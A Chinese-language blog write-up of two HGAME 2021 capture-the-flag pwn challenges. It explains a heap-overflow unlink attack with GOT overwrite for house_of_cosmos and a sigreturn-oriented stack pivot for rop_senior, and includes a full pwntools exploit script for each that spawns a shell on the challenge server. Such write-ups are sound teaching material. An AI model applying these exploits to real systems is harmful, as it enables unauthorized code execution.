<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>HGAME2021-WEEK4-PWN-WP - blog of chuj</title><link rel=icon type=image/png href=https://chujdk.github.io/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。
house_of_cosmos
漏洞点看了很久才看出来

读入函数这里的 i 是 unsigned int，所以当 a2 <= 0 时，就可以输入几乎无限的字符，轻松实现堆溢出。由于没有提供 show 的功能，像前两周那样通过 Unsorted Bin 来 leak 的方法就比较难了。但是既然可以堆溢出，又有指向堆块的指针，我们就可以朴素地用 unlink 来实现利用。"><meta property="og:image" content><meta property="og:url" content="https://chujdk.github.io/wp/1108.html"><meta property="og:site_name" content="blog of chuj"><meta property="og:title" content="HGAME2021-WEEK4-PWN-WP"><meta property="og:description" content="hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。
house_of_cosmos 漏洞点看了很久才看出来
读入函数这里的 i 是 unsigned int，所以当 a2 <= 0 时，就可以输入几乎无限的字符，轻松实现堆溢出。由于没有提供 show 的功能，像前两周那样通过 Unsorted Bin 来 leak 的方法就比较难了。但是既然可以堆溢出，又有指向堆块的指针，我们就可以朴素地用 unlink 来实现利用。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-02-28T20:00:00+00:00"><meta property="article:modified_time" content="2021-02-28T20:00:00+00:00"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Hctf-Game"><meta name=twitter:card content="summary"><meta name=twitter:title content="HGAME2021-WEEK4-PWN-WP"><meta name=twitter:description content="hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。
house_of_cosmos 漏洞点看了很久才看出来
读入函数这里的 i 是 unsigned int，所以当 a2 <= 0 时，就可以输入几乎无限的字符，轻松实现堆溢出。由于没有提供 show 的功能，像前两周那样通过 Unsorted Bin 来 leak 的方法就比较难了。但是既然可以堆溢出，又有指向堆块的指针，我们就可以朴素地用 unlink 来实现利用。"><script src=https://chujdk.github.io/js/feather.min.js></script><link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.6dc922b4122291f1967a53b3e802e564596ed5068a8571e4221c9ead17563c3a.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>HGAME2021-WEEK4-PWN-WP</h1><div class=meta>Posted on Feb 28, 2021</div></div><section class=body><p>hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。</p><h3 id=house_of_cosmos>house_of_cosmos</h3><p>漏洞点看了很久才看出来</p><div style=text-align:center><img src=https://chujdk.github.io/usr/uploads/2021/02/1322405410.png></div><p>读入函数这里的 <code>i</code> 是 <code>unsigned int</code>，所以当 <code>a2 &lt;= 0</code> 时，就可以输入几乎无限的字符，轻松实现堆溢出。由于没有提供 <code>show</code> 的功能，像前两周那样通过 <code>Unsorted Bin</code> 来 leak 的方法就比较难了。但是既然可以堆溢出，又有指向堆块的指针，我们就可以朴素地用 <code>unlink</code> 来实现利用。</p><p>关于 <code>unlink</code>，我写过三篇 wp</p><ul><li><a href=https://chujdk.github.io/WP/buu-hitcon2014_stkof-wp.html>hitcon2014_stkof</a> &lt;= 这篇文章详细记录了 <code>unlink</code> 的利用原理</li><li><a href=https://chujdk.github.io/WP/xctf-4-reehy-main-100-wp.html>4-reehy-main-100</a></li><li><a href=https://chujdk.github.io/WP/buu-zctf2016_note2-wp.html>zctf2016_note2</a></li></ul><p>从做过的四道 <code>unlink</code> 题来看，都是一个套路。由于 <code>unlink</code> 能实现的效果是将一个指针指向其地址减三倍机器字长处。也就是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>p <span style=color:#666>=</span> <span style=color:#666>&amp;</span>p <span style=color:#666>-</span> <span style=color:#40a070>12</span> <span style=color:#60a0b0;font-style:italic>//32位
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>p <span style=color:#666>=</span> <span style=color:#666>&amp;</span>p <span style=color:#666>-</span> <span style=color:#40a070>24</span> <span style=color:#60a0b0;font-style:italic>//64位
</span></span></span></code></pre></div><p>那么一般的方法就是修改储存了 <code>chunk</code> 指针的数组中的某个指针，修改这个数组，通过程序本身提供的修改功能，实现任意地址读写。</p><p>本题的做法就是先申请四个 chunk，第一个大小为 0（这样就可以实现堆溢出），第二个不能太小，要放的下一个 fake chunk，第三个和第四个好像都没什么要求。我为了省事第二三个就都申请为 0x200 了。第四个的目的是为了防止 top chunk 的前向合并。</p><p>申请完后对第一个 chunk 进行 <code>update</code>，这个时候进行堆溢出，在第二个 chunk 中构造 fake chunk，并修改第三个 chunk 的 <code>prev_size</code> 和 <code>size</code> 域。<code>delete</code> 掉第三个 chunk 后就会触发 <code>unlink</code>，就可以对</p><div style=text-align:center><img src=https://chujdk.github.io/usr/uploads/2021/02/980412217.png></div><p>这一段内存完全修改了。</p><div style=text-align:center><img src=https://chujdk.github.io/usr/uploads/2021/02/2022809313.png></div><p>由于 <code>list</code> 和 <code>size</code> 两个数组是这样寻址的，其结构如下</p><table style=border-collapse:collapse;font-family:helvetica,arial,sans-serif data-eth-ms=50 border=1 data-eth-date="2021/2/25 12:01:48"><tr><td style=text-align:Center;color:#000;width:107px;white-space:no-wrap eth-cell=A1>address</td><td style=text-align:Center;color:#000;width:91px;white-space:no-wrap eth-cell=B1>content</td></tr><tr><td style=text-align:Center;color:#000;width:107px;white-space:no-wrap eth-cell=A2>0x4040C0</td><td style=text-align:Center;color:#000;width:91px;white-space:no-wrap eth-cell=B2 colspan=1>list[0 * 2]</td></tr><tr><td style=text-align:Center;color:#000;width:107px;white-space:no-wrap eth-cell=A3>0x4040C4</td><td style="border-bottom:solid 1px;text-align:Center;color:#000;width:91px;white-space:no-wrap" eth-cell=B3 colspan=1> </td></tr><tr><td style=text-align:Center;color:#000;width:107px;white-space:no-wrap eth-cell=A4>0x4040C8</td><td style=text-align:Center;color:#000;width:91px;white-space:no-wrap eth-cell=B4>size[0 * 4]</td></tr><tr><td style=text-align:Center;color:#000;width:107px;white-space:no-wrap eth-cell=A5>0x4040C12</td><td style=text-align:Center;color:#000;width:91px;white-space:no-wrap eth-cell=B5>null</td></tr><tr><td style=text-align:Center;color:#000;width:107px;white-space:no-wrap eth-cell=A6>0x4040C16</td><td style=text-align:Center;color:#000;width:91px;white-space:no-wrap eth-cell=B6 colspan=1>list[1 * 2]</td></tr><tr><td style=text-align:Center;color:#000;width:107px;white-space:no-wrap eth-cell=A7>0x4040C20</td><td style=text-align:Center;color:#000;width:91px;white-space:no-wrap eth-cell=B7 colspan=1> </td></tr><tr><td style=text-align:Center;color:#000;width:107px;white-space:no-wrap eth-cell=A8>0x4040C24</td><td style=text-align:Center;color:#000;width:91px;white-space:no-wrap eth-cell=B8>size[1 * 4]</td></tr><tr><td style=text-align:Center;color:#000;width:107px;white-space:no-wrap eth-cell=A9>0x4040C28</td><td style=text-align:Center;color:#000;width:91px;white-space:no-wrap eth-cell=B9>null</td></tr></table><p>所以覆写的时候需要注意一下。然后我们覆盖的时候就把第一个指向 <code>free@got</code>，第二个和第三个都指向 <code>atoi@got</code>，然后对第一个 chunk 进行 <code>update</code>，修改为 <code>puts@plt</code>，把第二个 chunk <code>free</code> 掉，就实现了 leak，计算出 <code>system</code> 的地址，对第三个 chunk 进行修改，把 <code>system</code> 写进去，然后 <code>atoi</code> 就是 <code>system</code> 了，在原来输入数字的时候输个 <code>"/bin/sh\x00"</code> 就可以 getshell 了。</p><p>由于是比较久前学的了，本身 <code>unlink</code> 也是比较麻烦的，所以这道题还是花了不少时间。</p><h4 id=exp>exp</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#39;tmux&#39;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./house_of_cosmos&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.113.72&#34;</span>,<span style=color:#40a070>31404</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./house_of_cosmos&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(size,payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice &gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice &gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>update</span>(index,payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice &gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)<span style=color:#60a0b0;font-style:italic>#index:0</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x200</span>,<span style=color:#4070a0>&#39;index:1</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x200</span>,<span style=color:#4070a0>&#39;index:2</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>add(<span style=color:#40a070>16</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)<span style=color:#60a0b0;font-style:italic>#index:3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ptr <span style=color:#666>=</span> <span style=color:#40a070>0x4040C0</span> <span style=color:#666>+</span> <span style=color:#40a070>2</span> <span style=color:#666>*</span> <span style=color:#40a070>1</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x211</span>)
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>+</span> p64(ptr <span style=color:#666>-</span> <span style=color:#40a070>0x18</span>) <span style=color:#666>+</span> p64(ptr <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x20</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> fake_chunk<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x200</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x200</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x210</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>update(<span style=color:#40a070>0</span>,payload)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x8</span> <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;free&#39;</span>]) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;atoi&#39;</span>]) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;atoi&#39;</span>]) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>update(<span style=color:#40a070>1</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>update(<span style=color:#40a070>0</span>,p64(elf<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#39;puts&#39;</span>])[:<span style=color:#666>-</span><span style=color:#40a070>1</span>] <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>atoi_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;system&#39;</span>] <span style=color:#666>+</span> (atoi_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;atoi&#39;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>update(<span style=color:#40a070>2</span>,p64(system_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h3 id=rop_senior>rop_senior</h3><p>上周考了 <code>ld-resolve</code>，当时就猜这周会考个 <code>srop</code>。</p><p><code>srop</code> 是一个很强大的利用方式。其实我觉得 <code>Sigreturn Oriented Programming</code> 不是很贴切，<code>Sigreturn Register Oriented Programming</code> 更符合利用的本质。同时我还认为，从某种意义上，<code>srop</code> 和信号机制完全没有关系。当时在看 <code>CTF-WIKI</code> 时，一上来就是信号机制，着实令人感到有些迷惑。</p><p>我对 <code>srop</code> 的一个小总结：<a href=https://chujdk.github.io/WP/srop%E6%80%BB%E7%BB%93.html>srop总结</a>。简单的来说，<code>srop</code> 就是通过 sigreturn 这个系统调用，来对寄存器实现完全控制的一种利用方式，在总结中我也提到控制方式是通过伪造 sigframe。sigframe 这个结构体 pwntools 中也提供了生成模板，也就没必要去记结构体具体是什么结构了。</p><p><code>srop</code> 有一道很经典的题就是 360 的 smallest。<a href=https://chujdk.github.io/WP/buu-360chunqiu2017_smallest-wp.html>我对该题的 WP</a></p><p>然后这道题和 360 的 smallest 那道题目的思路其实是一毛一样的，而且还要简单不少，因为 smallest 并没有已知的可读写页，还要先构造 <code>write</code> leak 栈地址；但是这道题是有的，所以都不需要 leak 栈地址了，直接栈迁移就可以了。</p><h4 id=一个比较巧的地方>一个比较巧的地方</h4><div style=text-align:center><img src=https://chujdk.github.io/usr/uploads/2021/02/1270560297.png></div><p>由于这里对进行了 <code>pop rbp</code>，所以要写入 8 个字节来跳过这里，然后 ret 的地址又是 8 个字节，这样就 16 个字节了，那完犊子了，64 位下 sigreturn 的系统调用号是 15。不幸的是我在这里卡了几分钟，错失一血。其实由于我们要返回的地址（<code>0x400647</code>）高位上都是 <code>\x00</code>，所以写七个字节就可以了，这样在 <code>sys_read</code> 结束后 <code>eax</code> 就是 15 了，就可以实现 sigreturn 了。</p><p>那么做法就是先在栈上布置好一个 sigframe，用 <code>'\x00'</code> 填充好下一步的返回地址。然后重新来一次，写 15 个字节，再 return 到 <code>syscall</code>，触发 sigreturn。通过之前布置好的 sigframe 实现栈迁移到地址已知的可读写页，并且在这里设置 <code>rax</code> 为 <code>read</code> 的系统调用号。这样我们就又有了一次 <code>read</code> 的机会，并且写入的地址是我们已知的，就可以把 <code>'/bin/sh'</code> 写到一个我们已知的地址上，之后就可以通过 <code>execve</code> 实现 getshell 了。</p><h4 id=exp-1>exp</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context(arch <span style=color:#666>=</span> <span style=color:#4070a0>&#39;amd64&#39;</span>,os <span style=color:#666>=</span> <span style=color:#4070a0>&#39;linux&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./rop_senior&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.113.72&#34;</span>,<span style=color:#40a070>30405</span>)
</span></span><span style=display:flex><span>syscall_pop_ret <span style=color:#666>=</span> <span style=color:#40a070>0x400647</span>
</span></span><span style=display:flex><span>bss_base <span style=color:#666>=</span> <span style=color:#40a070>0x601400</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sigframe <span style=color:#666>=</span> SigreturnFrame()
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rax <span style=color:#666>=</span> constants<span style=color:#666>.</span>SYS_read
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rdi <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rdx <span style=color:#666>=</span> <span style=color:#40a070>0x400</span>
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rsi <span style=color:#666>=</span> bss_base
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rsp <span style=color:#666>=</span> bss_base
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rip <span style=color:#666>=</span> syscall_pop_ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x40063A</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>16</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(sigframe)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;best</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sleep(<span style=color:#40a070>0.1</span>)
</span></span><span style=display:flex><span>sig_trig <span style=color:#666>=</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(syscall_pop_ret)[:<span style=color:#666>-</span><span style=color:#40a070>1</span>]
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(sig_trig)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sigframe <span style=color:#666>=</span> SigreturnFrame()
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rax <span style=color:#666>=</span> constants<span style=color:#666>.</span>SYS_execve
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rsp <span style=color:#666>=</span> bss_base
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rdx <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rsi <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rdi <span style=color:#666>=</span> bss_base <span style=color:#666>+</span> <span style=color:#40a070>0x200</span>
</span></span><span style=display:flex><span>sigframe<span style=color:#666>.</span>rip <span style=color:#666>=</span> syscall_pop_ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> (<span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x40063A</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>16</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(sigframe))<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x200</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sleep(<span style=color:#40a070>0.1</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendline(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sleep(<span style=color:#40a070>0.1</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(sig_trig)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/hctf-game>hctf-game</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a><a class=soc href=https://chujdk.github.io/index.xml rel=me title=Rss><i data-feather=rss></i></a>
<a class=border></a></div><div class=footer-info>2024 © chuj | Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>